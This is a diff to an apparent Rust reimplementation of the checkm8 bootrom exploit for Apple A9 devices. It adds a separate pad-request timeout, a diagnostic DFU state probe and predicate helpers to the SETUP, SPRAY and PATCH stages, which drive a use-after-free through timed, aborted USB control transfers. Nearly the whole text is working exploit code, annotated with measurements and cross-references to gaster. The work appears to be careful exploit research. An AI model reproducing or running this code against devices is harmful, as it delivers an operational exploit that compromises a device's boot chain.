@@ -26,14 +26,17 @@
 //! `RESET → SETUP → SPRAY → PATCH → bus reset → re-open → check PWND`, and a
 //! failed stage sends the machine back to RESET.
 
+use std::collections::BTreeMap;
 use std::thread::sleep;
 use std::time::{Duration, Instant};
 
 use crate::config::{all_configs, config_for_identity, PayloadKind, SocConfig};
 use crate::payload::{self, BuiltPayload, OVERWRITE_STRUCT_SIZE};
 use crate::trace::{kind, Tracer};
-use crate::types::{DriverClass, ResetCapability, RunOutcome, Stage, XferResult, XferStatus};
-use crate::usb::{CtrlReq, Transport};
+use crate::types::{
+    DriverClass, ResetCapability, ResetEvidence, RunOutcome, Stage, XferResult, XferStatus,
+};
+use crate::usb::{CtrlReq, ResetReport, Transport};
 use crate::{
     DFU_CLRSTATUS, DFU_DNLOAD, DFU_FILE_SUFFIX_LEN, DFU_GETSTATUS, DFU_MAX_TRANSFER_SZ,
     DFU_STATE_MANIFEST, DFU_STATE_MANIFEST_SYNC, DFU_STATE_MANIFEST_WAIT_RESET, DFU_STATUS_OK,
@@ -51,13 +54,21 @@ pub const LEAK_WINDEX_GASTER: u16 = 0x0A;
 /// The alternative `wIndex`, kept as a parameter because this is the one
 /// parameter of the algorithm we have not resolved against real hardware.
 ///
-/// **Not the same value `a9ctl` used.** `a9ctl/src/checkm8.rs:108` sets
-/// `LEAK_WINDEX_IPWNDFU = 0x40A` and comments that 0x40A is "ipwndfu's value";
-/// the frozen contract for this crate says `0x00`, which is what ipwndfu's
-/// `USBRequestLeak` passes as `wIndex` in the A9-adjacent paths and what the
-/// A9 bootrom's DFU stack is expected to want. We did not re-derive either from
-/// a vendored ipwndfu, so neither is claimed as measured: both are exposed so a
-/// single A/B run decides it. `a9pwn run --leak-windex-ipwndfu` selects this one.
+/// **Provenance, corrected** (`docs/VERIFICATION-live-run.md` §6 / B5). This
+/// constant's value is frozen by `INTERFACE.md` §4 and is left alone, but the
+/// claim that `0x00` is what ipwndfu passes is **not supported by the vendored
+/// ipwndfu**: `research/refs/ipwndfu/checkm8.py:123-124` passes `wIndex = 0x40A`
+/// for `usb_req_leak` / `usb_req_no_leak` (gaster's `0x0A` at `gaster.c:52`,
+/// used at `:866`/`:875`/`:886`), and ipwndfu's own config table
+/// (`checkm8.py:439-449`) has **no A9 row at all** — it cannot be a second
+/// opinion on this silicon. `a9ctl/src/checkm8.rs:108` is the one that used
+/// `0x40A` and attributed it to ipwndfu.
+///
+/// So: `0x0A` is the only sourced value for CPID 0x8003, and `0x00` is an
+/// **uncited** second value that exists here because the frozen interface says
+/// it does. `a9pwn run --leak-windex-ipwndfu` selects this one — the flag's name
+/// is a misnomer, and the genuine alternative (`0x40A`) is not reachable from
+/// the CLI. Neither is claimed as measured.
 pub const LEAK_WINDEX_IPWNDFU: u16 = 0x00;
 
 /// Bound on the SPRAY loop, which in the reference is also `for(;;)`
@@ -68,6 +79,16 @@ pub const LEAK_WINDEX_IPWNDFU: u16 = 0x00;
 
 /// gaster's own default, and the value every run of the previous session used.
 const DEFAULT_USB_TIMEOUT_MS: u32 = 5;
+
+/// The pad request's default timeout: **gaster's own `usb_timeout` value**.
+///
+/// Not because the pad is unimportant — it IS the pass condition — but because
+/// raising it does not buy the device time to answer a question; it buys the
+/// device's ~21-37 ms EP0 **watchdog** enough time to fake a STALL, which is a
+/// false pass with no corruption behind it. `--pad-timeout-ms` exists so that
+/// experiment can still be run deliberately; the default must not manufacture it.
+/// See [`RunOptions::pad_timeout_ms`] for the measurements.
+const DEFAULT_PAD_TIMEOUT_MS: u32 = 5;
 
 // ---------------------------------------------------------------------------
 // Stage results
@@ -91,8 +112,16 @@ const DEFAULT_USB_TIMEOUT_MS: u32 = 5;
 /// | `SPRAY_BUDGET_EXHAUSTED` | the stall/leak/no-leak loop never converged |
 /// | `PATCH_OVERWRITE_NOT_STALLED` | the 48-byte callback overflow did not STALL |
 /// | `PATCH_OVERWRITE_SIZE_INVALID` | the built overflow buffer is not one `dfu_callback_t` |
-/// | `PATCH_UPLOAD_SHORT` | a payload chunk did not return OK with every byte sent |
 /// | `TRANSPORT_DEVICE_LOST` | the device disappeared mid-stage |
+///
+/// `PATCH_UPLOAD_SHORT` is deliberately **not** in that table: it is recorded as a
+/// failed predicate (`trace::Counters::predicate_failed`), an event and a printed
+/// warning, but it does **not** fail the stage. gaster's chunk loop cannot fail
+/// (`gaster.c:226-240` returns true unconditionally and `:1215` passes
+/// `transfer_ret = NULL`), so stopping there would discard the suffix, the end
+/// DNLOAD and the MANIFEST walk — five of an attempt's seven transfers — from an
+/// experiment the reference would have completed. See `stage_patch`.
+///
 /// All three fields are deliberate: `code` is what a reader greps for, `detail`
 /// is what a human reads, `last` is the evidence. (`XferResult` is only
 /// `Debug + Clone` in §1, so neither this type nor `StageResult` can derive
@@ -136,6 +165,20 @@ fn fail(code: &'static str, detail: impl Into<String>, last: Option<XferResult>)
 // ---------------------------------------------------------------------------
 
 /// Caps on the SETUP sweep. Both are honoured; whichever trips first wins.
+///
+/// **Per `stage_setup` call, i.e. per round** — the default is 20 000 attempts /
+/// 600 000 ms, so a 64-round run in which SETUP never converges can occupy ≈10.6
+/// hours, and SPRAY shares the same budget (≈21 h worst case). That is a
+/// deliberate deviation from the reference, whose SETUP loop cannot exit at all
+/// (`gaster.c:852`); the wall-clock is the price of it, and the operator sets
+/// `--setup-budget` deliberately rather than discovering this at hour six
+/// (`docs/VERIFICATION-live-run.md` D3/§5 row 5).
+///
+/// The wall-clock depends on [`RunOptions::pad_timeout_ms`]: at its default (5 ms,
+/// gaster's value) a failing attempt costs roughly 15 ms of host work, so the
+/// attempts cap is the binding one; a deliberately raised pad timeout makes the
+/// millis cap trip first and the sweep shorter in attempts. Those are the same
+/// knob seen from two sides, not a regression either way.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub struct SetupBudget {
     pub max_attempts: u64,
@@ -155,7 +198,62 @@ impl Default for SetupBudget {
 pub struct RunOptions {
     pub max_rounds: u32,
     /// gaster's `usb_timeout` (gaster.c:1631-1633 default 5).
+    ///
+    /// This is the **abort window** base and nothing else: `stage_setup` derives
+    /// its sweep from it (`usb_timeout - 1`, then `(t+1) % (usb_timeout -
+    /// abort_min + 1) + abort_min`) and every other request in the sweep uses it.
+    /// Do not raise it to give the pad more time — a window above ~4 ms lets the
+    /// whole 2048-byte DNLOAD through and the sweep stops being a sweep. The pad
+    /// has its own timeout for exactly that reason.
     pub usb_timeout_ms: u32,
+    /// The timeout for the **pad request only** (`bm=0, b=0, wValue=0, wIndex=0`,
+    /// `wLength = overwrite_pad - transferred`) — the request that IS SETUP's
+    /// pass condition (`gaster.c:853`).
+    ///
+    /// **Why it is a separate parameter.** gaster passes its global `usb_timeout`
+    /// here because on Linux the device answers quickly. That value is an *abort
+    /// window*, not a budget for how long a device may take to answer, so
+    /// decoupling the two is right: an experiment can move the pad timeout without
+    /// touching the sweep, whereas raising `usb_timeout_ms` would let the
+    /// 2048-byte DNLOAD complete and destroy the abort sweep. The **default is
+    /// gaster's 5 ms** — see the watchdog finding below for why it must not be
+    /// raised silently.
+    ///
+    /// **The watchdog finding (MEASURED on this unit).** Every pad completion we
+    /// have ever seen falls in **21.4-36.6 ms with none below 21 ms**: run 2's six
+    /// (3 STALLs, 3 OKs) at 21.4, 22.9, 24.5, 25.3, 27.2, 27.9 ms, and a
+    /// first-attempt STALL at 23.308 ms on a freshly re-entered device. A hard
+    /// floor with no samples beneath it is a fixed device-side latency, not a
+    /// timing race — this ROM **stalls a stuck EP0 request on a watchdog timer**
+    /// at roughly 21-37 ms.
+    ///
+    /// That reframes SETUP. gaster's pad timeout is 5 ms, so gaster never sees
+    /// that watchdog either — and gaster does pwn A9 devices. A genuine corruption
+    /// STALL must therefore arrive **fast** (sub-millisecond to a few ms), and
+    /// every STALL in our history is our own timeout stretching past the watchdog
+    /// floor rather than evidence that the use-after-free happened at all. With a
+    /// 40 ms pad timeout SETUP "passes" on essentially every attempt with no
+    /// corruption behind it — a false pass, which is what this default prevents.
+    ///
+    /// **Operational rule: a pad STALL arriving at 20-40 ms is the watchdog and is
+    /// NOT evidence of corruption. A genuine pass should be fast. Treat a slow
+    /// STALL as a red flag in the trace, not as a win.**
+    ///
+    /// Since the pad now runs on the transport's true-deadline primitive, that
+    /// rule is enforced rather than merely written down: at the default 5 ms the
+    /// ~21-37 ms watchdog is unreachable, so **`pad_stall` goes to zero on every
+    /// attempt and `pad_timeout` dominates — that is the correct outcome, not a
+    /// regression.** A `pad_stall` that was really a watchdog is indistinguishable
+    /// from a NAK, so counting it as a pass was never evidence of anything; with
+    /// the true deadline, `PAD_TIMEOUT_NOT_STALL` firing on every attempt is an
+    /// honest statement about the device instead of a lottery result.
+    ///
+    /// Raising this deliberately (via `--pad-timeout-ms`) is a legitimate
+    /// experiment *provided* the latency of any resulting STALL is read as a
+    /// verdict on the primitive rather than as success. The drain DNLOAD and the
+    /// `DFU_GETSTATUS` reads stay on `usb_timeout_ms`; they are not the pass
+    /// condition and a second variable must not move with this one.
+    pub pad_timeout_ms: u32,
     /// gaster's `usb_abort_timeout_min` (gaster.c:1635-1637 default 0).
     pub abort_timeout_min_ms: u32,
     pub leak_windex: u16,
@@ -166,6 +264,27 @@ pub struct RunOptions {
     pub stage_filter: Option<Stage>,
     pub setup_budget: SetupBudget,
     pub stop_after_setup_stall: bool,
+    /// **DIAGNOSTIC DEVIATION — not part of gaster's sequence, and off by
+    /// default so the shipped exploit path stays byte-identical to the
+    /// reference.** When set, `stage_setup` issues one `DFU_GET_STATUS` between
+    /// the aborted DNLOAD and the pad request and records the device's own
+    /// `bState`, to separate two readings of `abort_xfer=0` on every attempt:
+    ///
+    /// * still `5` (`dfuDNLOAD-IDLE`) → the ROM never registered the DNLOAD, so
+    ///   the primitive fails at its first step and no abort-timing work can fix
+    ///   it;
+    /// * `3` (`dfuDNLOAD-SYNC`) or `4` (`dfuDNBUSY`) → the ROM took the download
+    ///   and is mid-transaction, so the request did register;
+    /// * `10` (`dfuERROR`) → it registered and rejected it: a third answer.
+    ///
+    /// gaster never reads this (`gaster.c:853` goes straight from the cancel to
+    /// the pad), so it is pure added information — and it costs one control
+    /// transfer per attempt. **That cost is a real perturbation**: an extra EP0
+    /// request sits inside the very request sequence whose shape is the heap
+    /// corruption, so a probe run's STALL count cannot be compared with a
+    /// non-probe run's. Read the probe run as "what state does the device report
+    /// here", not as a better exploit attempt.
+    pub probe_setup_state: bool,
     pub settle_ms: u32,
 }
 
@@ -174,6 +293,7 @@ impl Default for RunOptions {
         RunOptions {
             max_rounds: 64,
             usb_timeout_ms: DEFAULT_USB_TIMEOUT_MS,
+            pad_timeout_ms: DEFAULT_PAD_TIMEOUT_MS,
             abort_timeout_min_ms: 0,
             leak_windex: LEAK_WINDEX_GASTER,
             dry_run: false,
@@ -183,6 +303,7 @@ impl Default for RunOptions {
             stage_filter: None,
             setup_budget: SetupBudget::default(),
             stop_after_setup_stall: false,
+            probe_setup_state: false,
             settle_ms: 0,
         }
     }
@@ -192,6 +313,15 @@ impl RunOptions {
     fn timeout_ms(&self) -> u32 {
         self.usb_timeout_ms.max(1)
     }
+}
+
+/// The pad request's timeout. Pure and separate from [`RunOptions::timeout_ms`]
+/// so a refactor cannot silently re-couple them: the pad must live long enough to
+/// see the device answer (that answer is the pass condition), while the aborted
+/// DNLOAD's window must stay short or the transfer completes and the sweep
+/// degenerates. `0` is treated as `1`, like the abort window.
+fn pad_timeout(opts: &RunOptions) -> u32 {
+    opts.pad_timeout_ms.max(1)
 }
 
 pub struct StageIo<'a> {
@@ -278,9 +408,32 @@ pub fn abort_completed(r: &XferResult) -> bool {
 /// `Error`, zero measured micros, and — the distinguishing field — no abort
 /// window at all, because the transfer was never submitted. A genuinely reaped
 /// `Error` always carries `abort_after_ms = Some(t)` from `control_async_abort`.
-/// Used only to stop a dead handle from being swept 20 000 times.
+/// Used to stop a dead handle from being swept 20 000 times, and in SPRAY so a
+/// never-submitted leak cannot be scored as a successful one (see
+/// [`leak_satisfied`]).
 pub fn abort_was_refused(r: &XferResult) -> bool {
     r.status == XferStatus::Error && r.abort_after_ms.is_none() && r.micros == 0
+}
+
+/// Did a SPRAY leak / no-leak transfer satisfy the reference's predicate —
+/// `send_..._async_no_data(...) && transfer_ret.sz == 0` (gaster.c:866, :886)?
+///
+/// Two exclusions, both from the reference:
+///
+/// * `NoDevice` is not a measurement ([`abort_completed`]); the transport
+///   refuses further transfers on that handle anyway.
+/// * A **refused** transfer was never submitted, so it cannot stand in for
+///   gaster's `completed != 0` clause (`gaster.c:282`). Without this exclusion a
+///   device that died between the stall and the leak returns the refused shape
+///   — `Error`, 0 bytes — which is `abort_completed` and `transferred == 0`, so
+///   the leak *and* the no-leak would score as successes and SPRAY would return
+///   `Pass` on a dead handle (`docs/VERIFICATION-live-run.md` B3).
+///
+/// Note what is deliberately **kept**: a reaped `Error` that moved 0 bytes still
+/// satisfies the predicate, because gaster's own wrapper counts every terminal
+/// status as completed (`gaster.c:220-223`, `:282`) — see [`abort_completed`].
+pub fn leak_satisfied(r: &XferResult) -> bool {
+    abort_completed(r) && !abort_was_refused(r) && r.transferred == 0
 }
 
 /// The pad request length, or `None` when gaster would not send one.
@@ -297,39 +450,82 @@ pub fn pad_request_len(overwrite_pad: u32, transferred: usize) -> Option<u32> {
     Some(overwrite_pad - transferred as u32)
 }
 
+/// The **whole** of gaster.c:853's pass condition: the aborted transfer delivered
+/// fewer than `overwrite_pad` bytes *and* the pad request came back `STALL`.
+///
+/// Pure, and split out of the sweep so the gate itself is pinned by a test.
+/// Before this, `pad_predicate_matches_gaster_853` pinned only the length half
+/// of the predicate, so the STALL requirement — the thing that *is* SETUP's
+/// success signal, and the proof HANDOFF §6.3 exists to produce — rested on
+/// inspection alone (`docs/VERIFICATION-live-run.md` Q1/Q2, B4).
+///
+/// `pad` is `None` when no pad request was sent, which happens when the aborted
+/// transfer delivered `>= overwrite_pad`: gaster's `&&` short-circuits there, so
+/// such an attempt cannot pass.
+pub fn setup_passed(
+    abort_transferred: usize,
+    overwrite_pad: u32,
+    pad: Option<&XferResult>,
+) -> bool {
+    if pad_request_len(overwrite_pad, abort_transferred).is_none() {
+        return false;
+    }
+    matches!(pad, Some(p) if p.status == XferStatus::Stall)
+}
+
 // ---------------------------------------------------------------------------
 // Low-level request helpers, named after gaster's
 // ---------------------------------------------------------------------------
 
-/// gaster's `send_usb_control_request_no_data` (gaster.c:467-480): a zeroed
-/// buffer of `len` bytes, or a true zero-length transfer when `len == 0`.
-fn req_no_data(io: &mut StageIo, bm: u8, b: u8, value: u16, index: u16, len: u16) -> XferResult {
+/// [`req_ctrl`] with an explicit timeout. Exactly one caller uses this: the pad
+/// request, whose timeout is a parameter of its own ([`pad_timeout`]) because
+/// that request is SETUP's pass condition and must outlive the Windows tick.
+/// Every other request in the sweep keeps `usb_timeout_ms`.
+///
+/// **This must go through the transport's true-deadline primitive.** The
+/// synchronous path cannot honour a timeout shorter than one system timer tick:
+/// a nominal 5 ms wait returns anywhere in ~8-31 ms on this host, which is how a
+/// ~21-37 ms device watchdog STALL got counted as a checkm8 pass. The primitive
+/// sends the same zeroed data stage and the same setup packet — no wire parameter
+/// moves — and reports a deadline expiry as `Timeout` (so `pad_timeouts` and
+/// `PAD_TIMEOUT_NOT_STALL` keep counting what they always counted) with
+/// `abort_after_ms = None` (so the tracer does not bucket the pad as a sweep
+/// attempt). A device answer still arrives as its own status, so `Stall` remains
+/// the pass condition and [`setup_passed`] is unchanged.
+fn req_ctrl_with_timeout(io: &mut StageIo, r: CtrlReq, timeout_ms: u32) -> XferResult {
+    io.usb
+        .control_with_deadline_no_data(r, timeout_ms.max(1))
+}
+
+/// gaster's `send_usb_control_request_no_data` (gaster.c:467-480) over a fully
+/// built request: a zeroed buffer of `r.length` bytes, or a true zero-length
+/// transfer when `r.length == 0`.
+///
+/// Takes a [`CtrlReq`] so the wire parameters of the stages that matter
+/// (SPRAY's triple, PATCH's overflow) come from pure constructors that a test
+/// can pin — `docs/VERIFICATION-live-run.md` B4: a future edit that changed
+/// PATCH's `wIndex = 0x80` (`gaster.c:1211`) to `0` was previously caught by
+/// nothing in the suite.
+fn req_ctrl(io: &mut StageIo, r: CtrlReq) -> XferResult {
     let timeout = io.opts.timeout_ms();
-    if len == 0 {
-        io.usb.control_no_data(
-            CtrlReq {
-                bm,
-                b,
-                value,
-                index,
-                length: 0,
-            },
-            timeout,
-        )
-    } else {
-        let buf = vec![0u8; len as usize];
-        io.usb.control_out(
-            CtrlReq {
-                bm,
-                b,
-                value,
-                index,
-                length: len,
-            },
-            &buf,
-            timeout,
-        )
-    }
+    req_ctrl_with_timeout(io, r, timeout)
+}
+
+/// gaster's `send_usb_control_request_no_data` (gaster.c:467-480) in the
+/// reference's own argument order. Delegates to [`req_ctrl`]; the RESET and
+/// SETUP call sites still spell their requests this way because that is how
+/// `gaster.c` spells them.
+fn req_no_data(io: &mut StageIo, bm: u8, b: u8, value: u16, index: u16, len: u16) -> XferResult {
+    req_ctrl(
+        io,
+        CtrlReq {
+            bm,
+            b,
+            value,
+            index,
+            length: len,
+        },
+    )
 }
 
 /// A real data-bearing control transfer, `gaster`'s `send_usb_control_request`
@@ -339,9 +535,17 @@ fn req_out(io: &mut StageIo, r: CtrlReq, data: &[u8]) -> XferResult {
     io.usb.control_out(r, data, timeout)
 }
 
-/// gaster's `send_usb_control_request_async_no_data` (gaster.c:482-495): the
-/// transfer is submitted and aborted after `cancel_after_ms`, and the byte count
-/// that actually crossed is what the caller decides on.
+/// gaster's `send_usb_control_request_async_no_data` (gaster.c:482-495) over a
+/// fully built request: the transfer is submitted and aborted after
+/// `cancel_after_ms`, and the byte count that actually crossed is what the
+/// caller decides on.
+fn req_async_ctrl(io: &mut StageIo, r: CtrlReq, cancel_after_ms: u32) -> XferResult {
+    let mut buf = vec![0u8; r.length as usize];
+    io.usb.control_async_abort(r, &mut buf, cancel_after_ms)
+}
+
+/// The reference's argument order for the async helper. Delegates to
+/// [`req_async_ctrl`].
 fn req_async(
     io: &mut StageIo,
     bm: u8,
@@ -351,8 +555,8 @@ fn req_async(
     len: u16,
     cancel_after_ms: u32,
 ) -> XferResult {
-    let mut buf = vec![0u8; len as usize];
-    io.usb.control_async_abort(
+    req_async_ctrl(
+        io,
         CtrlReq {
             bm,
             b,
@@ -360,7 +564,6 @@ fn req_async(
             index,
             length: len,
         },
-        &mut buf,
         cancel_after_ms,
     )
 }
@@ -510,7 +713,40 @@ fn reset_recovery(
 // SETUP
 // ---------------------------------------------------------------------------
 
-/// The whole point of this rewrite: a SETUP sweep that says what it tried.
+/// One `DFU_GET_STATUS`, recording the raw `bState`.
+///
+/// **Diagnostic only** (`RunOptions::probe_setup_state`, off by default): gaster
+/// never reads the state between the cancel and the pad (`gaster.c:853`), so this
+/// is added information, not a correction. See that option's doc for what each
+/// answer means and for why a probe run is not comparable with a non-probe one.
+///
+/// `bState` is byte 4 of the 6-byte reply, as everywhere else in this crate
+/// (`usb.rs`'s `dfu_status_state` uses the same offset and the same `>= 5`
+/// guard). `None` is **unread**, never a state.
+fn probe_dfu_state(io: &mut StageIo) -> Option<u8> {
+    let mut buf = [0u8; 6];
+    let timeout = io.opts.timeout_ms();
+    let r = io.usb.control(
+        CtrlReq {
+            bm: 0xA1,
+            b: DFU_GETSTATUS,
+            value: 0,
+            index: 0,
+            length: 6,
+        },
+        &mut buf,
+        timeout,
+    );
+    io.trace.xfer(Stage::Setup, "setup_probe_get_status", &r);
+    if r.status == XferStatus::Ok && r.transferred >= 5 {
+        Some(buf[4])
+    } else {
+        None
+    }
+}
+
+/// gaster's `checkm8_stage_setup` (gaster.c:848-860) — and the whole point of this
+/// rewrite: a SETUP sweep that says what it tried.
 ///
 /// Target transfer sizes and the pass condition are gaster's, unchanged
 /// (gaster.c:848-860):
@@ -522,23 +758,32 @@ fn reset_recovery(
 ///    **STALL is the pass condition**;
 /// 3. otherwise (or if the pad did not STALL) send a `DFU_DNLOAD` of
 ///    `EP0_MAX_PACKET_SZ` and advance the window.
+///
+/// The one parameter that is ours and not gaster's is the pad request's timeout
+/// ([`RunOptions::pad_timeout_ms`]): gaster asks the pad question with
+/// `usb_timeout`, which on this host cut the answer off before the device gave
+/// it. Everything else here — order, lengths, windows, the `bm=0,b=0` pad — is the
+/// reference's.
 pub fn stage_setup(io: &mut StageIo) -> StageResult {
     let usb_timeout = io.opts.timeout_ms();
     let abort_min = io.opts.abort_timeout_min_ms.min(usb_timeout);
     let span = window_span(usb_timeout, abort_min);
     let pad_target = io.cfg.overwrite_pad;
+    let pad_timeout = pad_timeout(io.opts);
     let mut window = initial_abort_window(usb_timeout, abort_min);
 
-    let mut stats = SetupStats::new(pad_target, usb_timeout, abort_min);
+    let mut stats = SetupStats::new(pad_target, usb_timeout, abort_min, pad_timeout);
     let started = Instant::now();
 
     io.trace.event(
         "setup_begin",
         Some(Stage::Setup),
         &format!(
-            "overwrite_pad=0x{pad_target:X} usb_timeout={usb_timeout}ms abort_min={abort_min}ms \
-             first_window={window}ms span={span} budget_attempts={} budget_ms={} \
-             (gaster.c:849 starts at usb_timeout-1)",
+            "overwrite_pad=0x{pad_target:X} usb_timeout={usb_timeout}ms pad_timeout={pad_timeout}ms \
+             abort_min={abort_min}ms first_window={window}ms span={span} budget_attempts={} \
+             budget_ms={} (gaster.c:849 starts at usb_timeout-1; pad_timeout is gaster's 5 ms by \
+             default and is ours to move — a pad STALL at 20-40 ms is the device's EP0 watchdog, \
+             not corruption; see RunOptions::pad_timeout_ms)",
             io.opts.setup_budget.max_attempts, io.opts.setup_budget.max_millis
         ),
     );
@@ -606,10 +851,39 @@ pub fn stage_setup(io: &mut StageIo) -> StageResult {
             );
         }
 
+        let completed = abort_completed(&abort);
+
+        // DIAGNOSTIC, not gaster (see `RunOptions::probe_setup_state`): ask the
+        // *device* whether the DNLOAD registered at all, since USBPcap can only
+        // show what the host offered. Recorded, never acted on: the pass
+        // condition, the pad, the drain and the window are untouched, and this
+        // branch does not exist unless the operator asked for it.
+        if io.opts.probe_setup_state && completed {
+            let state = probe_dfu_state(io);
+            stats.record_probe(state);
+            let detail = format!(
+                "attempt={} probe_state={} (after the aborted DNLOAD returned {} with {} bytes); \
+                 tally=[{}]; DIAGNOSTIC DEVIATION — gaster.c:853 never reads this, and the probe \
+                 itself perturbs the sequence, so this run is not comparable with a non-probe one",
+                stats.attempts,
+                match state {
+                    Some(s) => format!("{s} ({})", dfu_state_label(s)),
+                    None => "unread".to_string(),
+                },
+                abort.status,
+                abort.transferred,
+                stats.probe_tally_line()
+            );
+            io.trace
+                .event("setup_probe_state", Some(Stage::Setup), &detail);
+            if should_print_attempt(io.opts, stats.attempts) {
+                println!("  SETUP: {}", one_line(&detail));
+            }
+        }
+
         // 2. the pad request, exactly when gaster sends one.
         let mut pad_len: Option<u32> = None;
         let mut pad: Option<XferResult> = None;
-        let completed = abort_completed(&abort);
         if completed {
             if let Some(len) = pad_request_len(pad_target, abort.transferred) {
                 if len > u16::MAX as u32 {
@@ -628,7 +902,30 @@ pub fn stage_setup(io: &mut StageIo) -> StageResult {
                 // gaster.c:853 — bm=0, b=0, wValue=0, wIndex=0: a request the
                 // bootrom's DFU stack has no handler for, which is *why* a STALL
                 // here is the success signal.
-                let p = req_no_data(io, 0, 0, 0, 0, len as u16);
+                //
+                // **This one request carries its own timeout** (`pad_timeout_ms`,
+                // default = gaster's 5 ms). It IS the pass condition, so it is the
+                // one request whose deadline is worth being able to move
+                // independently — but the deadline must not be raised *silently*:
+                // this ROM watchdog-STALLs a stuck EP0 request at 21-37 ms, so a
+                // 40 ms timeout turns that watchdog into a false pass with no
+                // corruption behind it. A STALL at 20-40 ms is a red flag, not a
+                // win. The aborted DNLOAD, the drain DNLOAD and the GET_STATUS
+                // reads stay on `usb_timeout_ms`; moving them would let the
+                // 2048-byte DNLOAD complete and destroy the sweep. The wire
+                // parameters are unchanged. (`pad_timeout` is the local computed
+                // once at the top of the sweep.)
+                let p = req_ctrl_with_timeout(
+                    io,
+                    CtrlReq {
+                        bm: 0,
+                        b: 0,
+                        value: 0,
+                        index: 0,
+                        length: len as u16,
+                    },
+                    pad_timeout,
+                );
                 io.trace.xfer(Stage::Setup, "setup_pad_request", &p);
                 stats.record_pad(&p);
                 pad = Some(p);
@@ -652,32 +949,34 @@ pub fn stage_setup(io: &mut StageIo) -> StageResult {
             println!("  SETUP: WARNING - {msg}");
         }
 
-        if let Some(p) = &pad {
-            if p.status == XferStatus::Stall {
-                stats.pad_stalls += 1;
-                let summary = stats.summary();
-                io.trace.event("setup_summary", Some(Stage::Setup), &summary);
-                io.trace.event(
-                    "setup_stall",
-                    Some(Stage::Setup),
-                    &format!(
-                        "pad request of {pad_len:?} bytes STALLed after {} attempts — the pass \
-                         condition (gaster.c:853)",
-                        stats.attempts
-                    ),
-                );
-                println!("  SETUP: PASSED - pad STALL after {} attempts. {}", stats.attempts, one_line(&summary));
-                io.trace.predicate(
-                    Stage::Setup,
-                    "setup_pad_stall",
-                    true,
-                    &format!(
-                        "pad request of {pad_len:?} bytes STALLed on attempt {} (gaster.c:853)",
-                        stats.attempts
-                    ),
-                );
-                return StageResult::Pass;
-            }
+        // The pass condition, in full: fewer than `overwrite_pad` bytes and a
+        // pad request that STALLed (gaster.c:853). `pad_stalls` was already
+        // counted by `record_pad` when the pad was sent — it used to be
+        // incremented a second time here, so the summary reported 2 STALLs for
+        // one pad request. The trace counter (`setup_stall_seen`) was unaffected.
+        if setup_passed(abort.transferred, pad_target, pad.as_ref()) {
+            let summary = stats.summary();
+            io.trace.event("setup_summary", Some(Stage::Setup), &summary);
+            io.trace.event(
+                "setup_stall",
+                Some(Stage::Setup),
+                &format!(
+                    "pad request of {pad_len:?} bytes STALLed after {} attempts — the pass \
+                     condition (gaster.c:853)",
+                    stats.attempts
+                ),
+            );
+            println!("  SETUP: PASSED - pad STALL after {} attempts. {}", stats.attempts, one_line(&summary));
+            io.trace.predicate(
+                Stage::Setup,
+                "setup_pad_stall",
+                true,
+                &format!(
+                    "pad request of {pad_len:?} bytes STALLed on attempt {} (gaster.c:853)",
+                    stats.attempts
+                ),
+            );
+            return StageResult::Pass;
         }
 
         // 3. gaster.c:856-857 — the drain DNLOAD, then advance the window.
@@ -714,6 +1013,11 @@ struct SetupStats {
     pad_target: u32,
     usb_timeout: u32,
     abort_min: u32,
+    /// The pad request's deadline, as requested. Reported next to the measured
+    /// `pad_micros` so requested-vs-effective is auditable in one line: `5` and
+    /// `5337us` reads as "5 ms honoured, +337 us for the cancel". It is a sweep
+    /// parameter, not a transfer fact, which is why the transport does not carry it.
+    pad_deadline_ms: u32,
     windows: Vec<u32>,
     pad_sent: u64,
     pad_stalls: u64,
@@ -732,16 +1036,22 @@ struct SetupStats {
     span: u32,
     degenerate: bool,
     frozen_reported: bool,
+    /// `--probe-setup-state` only: the `bState` distribution seen between the
+    /// aborted DNLOAD and the pad, and how many probes went unread. Empty unless
+    /// the probe ran, so the default path's record is unchanged.
+    probe_states: BTreeMap<u8, u64>,
+    probe_unread: u64,
 }
 
 impl SetupStats {
-    fn new(pad_target: u32, usb_timeout: u32, abort_min: u32) -> SetupStats {
+    fn new(pad_target: u32, usb_timeout: u32, abort_min: u32, pad_deadline_ms: u32) -> SetupStats {
         let span = window_span(usb_timeout, abort_min);
         SetupStats {
             attempts: 0,
             pad_target,
             usb_timeout,
             abort_min,
+            pad_deadline_ms,
             windows: Vec::new(),
             pad_sent: 0,
             pad_stalls: 0,
@@ -761,6 +1071,35 @@ impl SetupStats {
             // (gaster.c:1635-1638), so it has the same trap.
             degenerate: span == 1,
             frozen_reported: false,
+            probe_states: BTreeMap::new(),
+            probe_unread: 0,
+        }
+    }
+
+    /// `--probe-setup-state` only. `None` is *unread*, and is tallied separately
+    /// so an unreadable state can never be folded into a real one.
+    fn record_probe(&mut self, state: Option<u8>) {
+        match state {
+            Some(s) => *self.probe_states.entry(s).or_insert(0) += 1,
+            None => self.probe_unread += 1,
+        }
+    }
+
+    /// The running state distribution, so the *last* probe line of a sweep carries
+    /// the whole result: `5 (dfuDNLOAD-IDLE)=12, 4 (dfuDNBUSY)=1, unread=3`.
+    fn probe_tally_line(&self) -> String {
+        let mut parts: Vec<String> = self
+            .probe_states
+            .iter()
+            .map(|(s, n)| format!("{} ({})={}", s, dfu_state_label(*s), n))
+            .collect();
+        if self.probe_unread > 0 {
+            parts.push(format!("unread={}", self.probe_unread));
+        }
+        if parts.is_empty() {
+            "-".to_string()
+        } else {
+            parts.join(", ")
         }
     }
 
@@ -845,7 +1184,8 @@ impl SetupStats {
         let pad_part = match (pad_len, pad) {
             (Some(len), Some(p)) => format!(
                 "pad_req={len} after_abort_status={} after_abort_xfer={}/{} \
-                 after_abort_rc={} pad_status={} pad_xfer={}/{} pad_micros={}",
+                 after_abort_rc={} pad_status={} pad_xfer={}/{} pad_deadline_ms={} pad_micros={} \
+                 (requested vs effective; usb_timeout={}ms defines the abort sweep, not this)",
                 abort.status,
                 abort.transferred,
                 abort.requested,
@@ -853,11 +1193,14 @@ impl SetupStats {
                 p.status,
                 p.transferred,
                 p.requested,
-                p.micros
+                self.pad_deadline_ms,
+                p.micros,
+                self.usb_timeout
             ),
             (Some(len), None) => format!(
-                "pad_req={len} after_abort_status={} after_abort_rc={} pad_status=NOT_SENT",
-                abort.status, abort.libusb_rc
+                "pad_req={len} after_abort_status={} after_abort_rc={} pad_status=NOT_SENT \
+                 (pad_deadline_ms={})",
+                abort.status, abort.libusb_rc, self.pad_deadline_ms
             ),
             _ => format!(
                 "pad_req=none (delivered >= overwrite_pad 0x{:X}) after_abort_status={} \
